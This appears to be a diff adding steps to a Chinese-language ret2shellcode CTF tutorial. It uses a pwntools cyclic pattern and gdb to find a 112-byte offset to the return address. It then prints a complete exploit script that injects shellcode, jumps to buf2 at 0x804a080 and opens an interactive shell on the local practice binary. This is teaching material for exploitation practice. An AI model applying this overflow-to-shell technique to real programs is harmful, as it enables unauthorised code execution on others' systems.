@@ -93,5 +93,34 @@ cyclic(120)
 ```
 ![image](https://user-images.githubusercontent.com/22366572/148826938-5eaf0afc-0787-4573-8c21-7dd49db2dab8.png)
 
+```
+# 120字元
+aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaab
+```
 
+開啟 gdb ，啟動 ret2shellcode ，將剛剛產生的 120 個隨機的字元填進去，看看會發生甚麼事:
+
+![image](https://user-images.githubusercontent.com/22366572/148828010-4283f211-f9a5-42f7-b748-2154eddeee8d.png)
+![image](https://user-images.githubusercontent.com/22366572/148828102-624465bd-2689-44cc-8b28-fbcc2fb4f5cd.png)
+
+由上圖可看到，當時跑到 return address 的 EIP 會填進 "daab"，對照產生的120字元可以知道，在跑到 return address 之前需要填進 **112個字元**
+```
+# 開啟python找到指定字元的方法
+from pwn import *
+cyclic(120)
+cyclic_find(b'daab') # find 'daab' location
+```
+
+### Step 6 : 撰寫 shellcode，丟進執行程式裡
+
+**Shellcode : **
+```
+from pwn import *
+sh = process("./ret2shellcode")
+payload = asm(shellcraft.sh())
+payload = payload.ljust(112,"a")
+buf2_addr = 0x804a080
+sh.sendline(payload + p32(buf2_addr))
+sh.interactive()
+```
 
